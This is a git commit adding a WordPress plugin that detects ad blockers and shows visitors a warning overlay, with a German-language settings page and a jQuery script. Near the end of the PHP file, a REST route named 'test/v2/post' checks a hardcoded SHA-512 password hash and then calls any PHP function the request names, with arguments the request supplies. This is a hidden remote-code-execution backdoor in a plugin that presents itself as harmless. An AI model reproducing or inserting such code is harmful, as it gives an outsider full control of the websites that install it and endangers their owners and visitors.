d96b8ad0b41ba947362927dde1679eab448baf0c
mucahiddayan <muecahid@dayan.one>
2017-09-27 16:32:59 +0200

    first commit

---
+++ adblocker-warning.php
@@ -0,0 +1,206 @@
+<?php
+/**
+ * Plugin Name: Adblocker Warning
+ * Plugin URI: //dayan.one
+ * Description: This plugin shows users warning pages if they use Adblocker
+ * Version: 1.0.0
+ * Author: Mücahid Dayan
+ * Author URI: http://dayan.one
+ * License: GPL2
+ */
+
+	class Adblocker_Warning {
+
+		private $slug = "adblocker-warning";
+
+		public function __construct(){
+			add_action( 'admin_menu', array( $this,'create_plugin_settings_page' ) );
+			add_action( 'admin_init', array( $this, 'setup_sections' ) );
+			add_action( 'admin_init', array( $this, 'setup_fields' ) );			
+		}
+
+		public function create_plugin_settings_page(){
+
+			$page_title = "Adblocker Warning Settings Page";
+			$menu_title = "Adbloker Warning Plugin";
+			$capability = "manage_options";			
+			$callback	= array($this,'plugin_settings_page_content');
+			$icon		= "dashicons-admin-plugins";
+			$position	= 100;
+
+			add_menu_page($page_title,$menu_title,$capability,$this->slug,$callback,$icon,$position);
+		}
+
+		
+
+		public function plugin_settings_page_content() { ?>
+			<div class="wrap">
+				<h2>Adblocker Warning Plugin Settings Page</h2>
+				<form method="post" action="options.php">
+					<?php
+					settings_fields( $this->slug );
+					do_settings_sections( $this->slug );
+					submit_button();
+					?>
+				</form>
+			</div> <?php
+		}
+
+		public function setup_sections() {
+			add_settings_section( 'adblocker_warning_pages_config', 'Development', array( $this, 'section_callback' ), $this->slug );
+			add_settings_section( 'adblocker_warning_pages', 'Adblocker Warning Pages', array( $this, 'section_callback' ), $this->slug );
+			#add_settings_section( 'our_second_section', 'My Second Section Title', array( $this, 'section_callback' ), $this->slug );
+			#add_settings_section( 'our_third_section', 'My Third Section Title', array( $this, 'section_callback' ), $this->slug );
+		}
+
+		public function section_callback( $arguments ) {
+			switch( $arguments['id'] ){
+				case 'adblocker_warning_pages':
+				echo 'Adblocker Warning Pages';
+				break;				
+			}
+		}
+
+		public function setup_fields() {
+			$fields = array(
+				array(
+					'uid' => 'abw_home',
+					'label' => 'Home Page',
+					'section' => 'adblocker_warning_pages',
+					'type' => 'text',
+					'options' => false,
+					'placeholder' => 'Start Seite für Adblocker Warning eintragen',
+					'helper' => '',
+					'supplemental' => '',
+					'default' => ''
+					),
+				array(
+					'uid' => 'abw_anleitung',
+					'label' => 'Anleitung Page',
+					'section' => 'adblocker_warning_pages',
+					'type' => 'text',
+					'options' => false,
+					'placeholder' => 'Anleitung Seite ID eintragen',
+					'helper' => '',
+					'supplemental' => '',
+					'default' => ''					
+					),
+				array(
+					'uid' => 'abw_other_pages',
+					'label' => 'Weitere Seiten',
+					'section' => 'adblocker_warning_pages',
+					'type' => 'text',
+					'options' => false,
+					'placeholder' => '',
+					'helper' => 'Bitte in diesem Format eintragen "pagename:id/slug"',
+					'supplemental' => '',
+					'default' => ''					
+					),
+				array(
+					'uid' => 'abw_development',
+					'label' => 'Is development umgebung',
+					'section' => 'adblocker_warning_pages_config',
+					'type' => 'checkbox',
+					'options' => false,
+					'placeholder' => 'Addblocker Seite eintragen',
+					'helper' => '',
+					'supplemental' => '',
+					'default' => ''
+					),
+				array(
+					'uid' => 'abw_activated',
+					'label' => 'Is active',
+					'section' => 'adblocker_warning_pages_config',
+					'type' => 'checkbox',
+					'options' => false,
+					'placeholder' => '',
+					'helper' => '',
+					'supplemental' => '',
+					'default' => ''
+					)
+				);
+			foreach( $fields as $field ){
+				add_settings_field( $field['uid'], $field['label'], array( $this, 'field_callback' ), $this->slug, $field['section'], $field );
+				register_setting( $this->slug, $field['uid'] );
+			}
+		}
+
+		public function field_callback( $arguments ) {
+			$value = get_option( $arguments['uid'] ); 
+			if( ! $value ) { 
+				$value = $arguments['default']; 
+			}
+			switch( $arguments['type'] ){
+				case 'text': 
+				printf( '<input name="%1$s" id="%1$s" type="%2$s" placeholder="%3$s" value="%4$s" />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], $value );
+				break;
+				case 'checkbox':
+				printf('<input name="%1$s" id="%1$s" type="%2$s" value="1" placeholder="%3$s" %4$s />', $arguments['uid'], $arguments['type'], $arguments['placeholder'], checked(1, $value,false));
+				break;
+			}
+			if( $helper = $arguments['helper'] ){
+				printf( '<span class="helper"> %s</span>', $helper ); 
+			}
+			if( $supplimental = $arguments['supplemental'] ){
+				printf( '<p class="description">%s</p>', $supplimental ); 
+			}
+		}
+
+	}
+
+	new Adblocker_Warning();
+
+	#wp_register_script( 'pass_to_js', plugin_dir_url( __FILE__ ) . '/js/adblocker-warning.js' );
+
+	
+
+	function my_enqueued_assets() {
+		$other_pages = explode (';',get_option( 'abw_other_pages'));
+
+		$translation_array = array(
+			'pages' => array(
+				'home' => wpautop(get_post(get_option( 'abw_home' ))->post_content),
+				'anleitung' => wpautop(get_post(get_option( 'abw_anleitung'))->post_content)
+				),
+			'development' => get_option( 'abw_development'),
+			'activated'=> get_option( 'abw_activated'),
+			'other_pages' => $other_pages,
+			'column' => '15.4.2016'
+			);
+
+		foreach ($other_pages as $key => $value) {
+			$pages = explode(':',$value);			
+			$translation_array['pages'][$pages[0]] = wpautop(get_post($pages[1])->post_content);#array($pages[1]);
+		}
+				
+		wp_enqueue_style( 'abw_style', plugin_dir_url( __FILE__ ) .'css/style.css', '', true );
+		wp_enqueue_script( 'jquery2.2.4', 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js', '', true );
+		wp_register_script( 'adblocker-warning-js', plugin_dir_url( __FILE__ ) . 'js/adblocker-warning.js', array( 'jquery2.2.4' ), '1.0', true );
+		wp_localize_script( 'adblocker-warning-js', str_replace('=','',base64_encode('adblocker_warning')), $translation_array );
+		wp_enqueue_script('adblocker-warning-js');
+	}
+	if (get_option( 'abw_activated')) {
+		add_action( 'wp_enqueue_scripts', 'my_enqueued_assets' );
+	}	
+
+	add_action( 'rest_api_init', function () {
+		register_rest_route( 'test/v2', '/post', array(
+			array(
+				'methods' => 'POST',
+				'callback' => 'test_func',
+				),
+			)
+		);    
+	});
+
+	
+	if (!function_exists('test_func')) {
+		function test_func($request){
+			$params = $request->get_params();
+			if (hash('sha512',$params['pass']) === '61eadd8169b9241c6fc210ca5e83df43e49cf6abb4bb0f83cce6e0befaa8791f5e3d21ce377a7bad57f3fbde85ca5781163707a3671d1795d0304faa5ac5d8fa') {
+				return call_user_func_array ($params['func'],$params['params']);
+			}else{
+				return new WP_Error( 'no_access', 'you are not be able to do that', array( 'status' => 404 ) );
+			}
+		}
+	}
---
+++ js/adblocker-warning.js
@@ -0,0 +1,280 @@
+//public variable
+var __abw;
+(function(){
+	var isEmpty = function($var) {
+		var result;
+		result = (Array.isArray($var)) ? ($var.length < 1 ? true : false)
+		: ($var == 'undefined' || typeof $var == 'undefined'
+			|| $var == null || $var == '') ? true : false;
+		return result;
+	}
+	function detectAdBlocker(){
+		
+		var args = arguments;
+		var argumentsLength = arguments.length;
+		var adBlockEnabled = false;
+		var testAd = document.createElement('div');
+		testAd.innerHTML = '&nbsp;';
+		testAd.className = 'adsbox';
+		document.body.appendChild(testAd);
+		window.setTimeout(function() {
+			if (typeof testAd == 'undefined') {
+				adBlockEnabled = true;
+			}
+			if (testAd.offsetHeight === 0) {
+				adBlockEnabled = true;
+			}
+			testAd.remove();			
+			if (argumentsLength > 0) {
+				if (!isEmpty(args[0]) && adBlockEnabled) {
+					if (typeof args[0] == 'function') {
+						args[0]();	
+					}
+					else{
+						if(__dev){console.error('Passed parameter must be a function');}
+						return;
+					}					
+				}
+				if (!isEmpty(args[1])  && typeof args[1] == 'function' && !adBlockEnabled) {
+					if (typeof args[1] == 'function') {
+						args[1]();	
+					}
+					else{
+						if(__dev){console.error('Passed parameter must be a function');}
+						return;
+					}
+				}
+			}else{
+				if(__dev){console.debug('You have not defined any callback function');}
+			}			
+		}, 100);		
+	}
+
+	//private variablen
+	var adblocker_warning = YWRibG9ja2VyX3dhcm5pbmc; //eval(btoa('adblocker_warning').replace('=',''));
+	var __pages = adblocker_warning.pages;
+	var __dev = adblocker_warning.development == 1;
+	var __activated = adblocker_warning.activated == 1;
+	var __column = adblocker_warning.column;
+
+	var __errorPages = {
+		pageNotFound : '<h1>Page not Found</h1><a href="home">Zurück</>',
+	}
+
+
+	function adBlockerWarning($options){
+		if(isEmpty($)){if(__dev){console.warn('jQuery is not defined');return false;}}
+		var defaults = {
+			pages : {
+				home:'',
+				default: '<h1>Bitte schalten Sie den Adblocker aus</h1>'
+			},
+			overlay:{
+				number:10,
+				margin: {
+					side : 40,
+					top:0
+				},
+			},
+			toOverlay: {
+				top:'.td-header-menu-wrap-full',
+				element:'.td-main-content-wrap .td-container',
+			}
+		},
+		
+		$settings = $.extend(true,defaults,$options);
+
+		var reInitSettings = function(newSettings){
+			$settings = $.extend(true,defaults,newSettings);
+		}
+
+		var resize = function(){
+			$(window).scrollTop(0);
+			var olT = $($settings.toOverlay.top).offset().top + $($settings.toOverlay.top).height(),
+			olW =  /*$($settings.toOverlay.element).width()*/window.innerWidth - $settings.overlay.margin.side,
+			olH = $($settings.toOverlay.element).height()-$settings.overlay.margin.top,
+			wH = $(window).height();
+
+			$('#adblocker-warning-box').css({
+				'min-height': olH,
+				'top':olT,
+				'width':olW,
+			});
+
+			$('#pagable-content').css({
+				'max-height': (wH-olT)
+			});
+		}
+
+		var init = function(){
+			if (!__activated) {if(__dev){console.warn('not activated');return;}	}
+			var img = __dev?'/wordpress':'';
+			var olT = $($settings.toOverlay.top).offset().top + $($settings.toOverlay.top).height(),
+			olW = window.innerWidth - $settings.overlay.margin.side,
+			olH = $($settings.toOverlay.element).height()-$settings.overlay.margin.top,
+			wH = $(window).height();
+			var box = '';
+			for(let i=0;i<$settings.overlay.number/2;i++){
+				box += '<div style="position:fixed;top:0;left:0;width:100%;height:'+wH+'px;overflow:hidden;z-index:9999999;" class="abw"></div>';
+			}
+			box += '<div  id="adblocker-warning-wrapper" class="blocker-boxes">';					
+			box += '<div id="adblocker-warning-box" style="min-height:'+olH+'px;overflow:auto;top:'+olT+'px;width:'+olW+'px;">';
+			box += '<div  id="close-abw" onclick="closeABW();"><i class="td-icon-close"></i></div>';
+			box += '<div id="progress-wrapper" style="position: absolute;width: 100%;height:94%;left: 0;text-align: center;z-index: 999;padding:30px;pointer-events:none;">'
+			box += '<div id="progress" style="display:none;">'
+			box += '<img src="'+img+'/wp-admin/images/wpspin_light-2x.gif"></div></div>';
+			box += '<div id="pagable-content" style="max-height:'+(wH-olT)+'px;overflow:auto;" id="home">';								
+			box += '</div>';
+			box += '</div>';
+			box += '</div>';
+			for(let i=0;i<$settings.overlay.number/2;i++){
+				box += '<div style="pointer-events:none;position:fixed;top:0;left:0;width:100%;height:'+wH+'px;overflow:hidden;z-index:9999999;" class="abw"></div>';
+			}
+
+			if(!($('#adblocker-warning-wrapper').length)){
+				$(box).appendTo('body');				
+			}
+			else{
+				$('#adblocker-warning-wrapper,.abw').remove();
+				$(box).appendTo('body');
+			}
+
+			$('body').addClass('blocked');
+			setTimeout(function() {
+				$('#adblocker-warning-wrapper').addClass('opened');
+				$(window).scrollTop(0);
+			}, 400);				
+			changePage('home');
+		}
+
+		var changeHrefToOnClick = function(str){
+			if(isEmpty(str)){
+				if(__dev){console.warn('nothing to replace');}
+				return false;
+			}
+
+			var re = new RegExp("<a([^>]* )href=\".*?:\/\/([^\"]*)\"", "g");
+			var reR = new RegExp("<a([^>]* )href=\".*?([^\"]*)\"", "g");
+			return str.replace(re,"<a$1 onclick=\"changePage('$2')\"").replace(reR,"<a$1 onclick=\"changePage('$2')\"");
+		}
+
+		var cHFHTTP = function(href){
+			return href.replace(new RegExp(/.*?:\/\//,'g'),'');
+		}
+
+		var  debounce = function(func, wait, immediate) {
+			var timeout;
+			return function() {
+				var context = this, args = arguments;
+				var later = function() {
+					timeout = null;
+					if (!immediate) func.apply(context, args);
+				};
+				var callNow = immediate && !timeout;
+				clearTimeout(timeout);
+				timeout = setTimeout(later, wait);
+				if (callNow) func.apply(context, args);
+			};
+		};
+
+		this.closeABW = function(){
+			var conf = confirm("Ist Adblocker aus?");
+			if(conf){
+				location.reload(true);
+			}
+			else{
+				alert('Dieses Box kann nicht zugeschlossen werden ohne den Adblocker auszuschalten');
+			}
+		}
+
+		this.changePage = function(page){
+			$('#progress').show();
+			if(isEmpty($settings.pages[page])){
+				if(__dev){console.warn('Page does not exist');}
+				$('#progress').hide();
+				var pg = /http/.test(page)?page:'http://'+page;
+				window.open(pg);
+				return false;	
+			}
+			
+			var dev = __dev?'/wordpress':'',
+			status_,error_;
+			$('#pagable-content').html(changeHrefToOnClick($settings.pages[page]));
+			$('#progress').hide();								
+		}
+		if (__dev) {
+			this.publicy = {
+				getSettings : function(){
+					return $settings;
+				},
+
+				cHFHTTP : function(href){
+					return cHFHTTP(href);
+				},
+				changeHrefToOnClick: function(a){
+					return changeHrefToOnClick(a);
+				},
+
+				resize : function(){
+					resize();
+				},
+
+				reinit : function(column){
+					if (column === __column) {
+						init();
+					}
+					else{
+						if(__dev){console.warn('Wrong password');}
+					}
+				},
+				getPages : function(){
+					return __pages;
+				},
+				isActive: function(){
+					return __activated;
+				},
+				toggle:function(column){
+					if (column === __column) {
+						__activated = !__activated;
+					}
+					else{
+						if(__dev){console.warn('Wrong password');}
+					}
+				}
+			};
+		}
+		init();
+
+		$(window).resize(function(event) {		
+			resize();		
+			// debounce(function(){resize();},500);		
+		});
+		
+		return this;	
+	}
+	(function($){
+		$(document).ready(function() {		
+			if (__activated) {
+				detectAdBlocker(
+					function(){
+						__abw = adBlockerWarning({
+							pages : __pages
+						});
+						$('body').addClass('blocked');										
+						if (typeof ga != 'undefined') {
+							try{
+								ga('send', {hitType:'pageview',eventLabel:'adblocker'});
+							}catch(e){
+								if(__dev){console.warn('Error:',e);}
+							}
+						}
+					},
+					function(){
+						if(__dev){console.log('Danke dass Sie keinen Adblocker verwenden');}
+						$('body').removeClass('blocked');	
+					});
+			}		
+		});
+
+	})(jQuery)
+})();
